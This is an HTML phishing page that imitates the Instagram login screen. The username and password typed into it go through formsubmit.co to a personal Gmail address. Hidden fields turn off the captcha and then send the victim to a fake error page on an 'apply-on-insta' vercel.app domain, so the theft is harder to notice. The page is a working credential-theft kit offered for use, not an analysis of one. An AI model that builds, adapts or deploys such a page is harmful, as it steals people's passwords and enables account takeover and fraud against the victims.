<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 80px; }
        .lang-select { color: #8e8e8e; font-size: 13px; margin-bottom: 50px; cursor: pointer; }
        .logo-container { margin-bottom: 40px; }
        .insta-logo { width: 65px; height: 65px; }
        form { width: 90%; max-width: 350px; display: flex; flex-direction: column; }
        input { width: 100%; height: 50px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 12px; padding: 0 15px; margin-bottom: 12px; font-size: 14px; }
        input:focus { border-color: #a8a8a8; outline: none; }
        .login-btn { width: 100%; height: 45px; background: #0064e0; border: none; border-radius: 25px; color: #fff; font-size: 16px; font-weight: 600; margin-top: 5px; cursor: pointer; }
        .forgot-pass { color: #000; font-size: 14px; font-weight: 500; text-decoration: none; text-align: center; margin-top: 20px; }
        .footer { margin-top: auto; width: 100%; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; }
        .create-btn { width: 90%; max-width: 350px; height: 45px; border: 1px solid #0064e0; border-radius: 25px; color: #0064e0; background: transparent; font-size: 14px; font-weight: 500; margin-bottom: 15px; cursor: pointer; }
        .meta-logo { width: 60px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="lang-select">English (India) ‚åµ</div>
    
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="insta-logo">
    </div>

    <form action="https://formsubmit.co/veer5128424@gmail.com" method="POST">
        <input type="text" name="Username" placeholder="Username, email address or mobile number" required>
        <input type="password" name="Password" placeholder="Password" required>
        
        <input type="hidden" name="_next" value="https://apply-on-insta.vercel.app/error.html">
        <input type="hidden" name="_captcha" value="false">

        <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot-pass">Forgotten password?</a>

    <div class="footer">
        <button class="create-btn">Create new account</button>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
    </div>
</body>
</html>
